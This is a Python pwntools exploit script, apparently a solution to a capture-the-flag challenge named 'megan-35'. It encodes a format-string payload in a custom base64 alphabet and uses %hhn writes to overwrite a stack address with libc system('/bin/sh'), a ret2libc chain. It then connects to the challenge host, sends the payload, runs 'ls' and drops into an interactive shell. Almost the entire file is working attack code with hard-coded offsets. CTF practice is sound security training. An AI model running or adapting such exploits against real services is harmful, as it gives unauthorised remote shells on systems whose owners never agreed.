#!/usr/bin/env python
from pwn import *
import base64
import sys
from struct import pack
import time
from binascii import hexlify
 
atom128 = "/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC"
megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"
zong22 = "ZKj9n+yf0wDVX1s/5YbdxSo=ILaUpPBCHg8uvNO4klm6iJGhQ7eFrWczAMEq3RTt2"
hazz15 = "HNO4klm6ij9n+J2hyf0gzA8uvwDEq3X1Q7ZKeFrWcVTts/MRGYbdxSo=ILaUpPBC5"
b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
  
class B64weird_encodings:
  
    def __init__(self, translation):
        b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        self.srch = dict(zip(b, translation))
        self.revlsrch = dict(zip(translation, b))
  
    def encode(self, pt):
        global srch
        b64 = base64.b64encode(pt)
        r = "".join([self.srch[x] for x in b64])
        return r
  
    def decode(self, code):
        global revlsrch
        b64 = "".join([self.revlsrch[x] for x in code])
        r = base64.b64decode(b64)
        return r    
  
def encode(variant, pt):
    encoder = B64weird_encodings(variant)
    return encoder.encode(pt)
  
def decode(variant, code):
    try:
        encoder = B64weird_encodings(variant)
        return encoder.decode(code)
    except KeyError:
        return "Not valid"
    except TypeError:
        return "Padding iccorrect"


# theirs
libc = 0xf7e19000
systemOffset = 0x3a940
binsh = 0x15900b
exit = 0x2e7b0

# mine
#libc = 0xf7ddc000
#systemOffset = 0x3b060
#binsh = 0x15fa0f
#exit = 0x2eaf0

# theirs 
where = 0xffffd05c
where += 0xd50
what = 0xffffdbac #system addr on stack

#mine
#where = 0xffffcffc
#what = 0xffffdbac #system addr on stack

what += 4

payload = pack("<I",where)
payload += pack("<I",where+1)
payload += pack("<I",where+2)
payload += pack("<I",where+3)
payload += pack("<I", libc+systemOffset)
payload += pack("<I", libc+exit)
payload += pack("<I", libc+binsh)

pl = len(payload)*3/4
mask = 0xff
newByte1 = ((what&mask) - pl) & mask
pl += newByte1
newByte2 = (((what&(mask<<8))>>8) - pl) & mask
pl += newByte2
newByte3 = (((what&(mask<<16))>>16) - pl) & mask

newByte4 = 0x01
newByte5 = 0xff
enc_payload = ""
enc_payload += "%" + str(newByte1) + "c%7$hhn" 
enc_payload += "%" + str(newByte2) + "c%8$hhn"
enc_payload += "%" + str(newByte3) + "c%9$hhn"
enc_payload += "%" + str(newByte4) + "c%10$hhn"
enc_payload += "%" + str(newByte5) + "c%10$hhn"

enc_payload = encode(megan35, enc_payload)

#mem leak
#payload = struct.pack("<I",0xffffdda0) + payload[4:] 
#enc_payload = "%x %x %x %x %x %x asdf%s"
#enc_payload = encode(megan35, enc_payload)

print(len(payload + enc_payload))

#p = process("megan-35")
p = remote("megan35.stillhackinganyway.nl", 3535)
time.sleep(0.2)
print(p.recv())
p.send(payload + enc_payload + '\n')
time.sleep(0.2)
#print(p.recvuntil("asdf"))
#print(hexlify(p.recv()))

p.send('ls\n')
try:
    out = p.recv(timeout=10)
    print out
    p.interactive()
except EOFError:
    p.close()


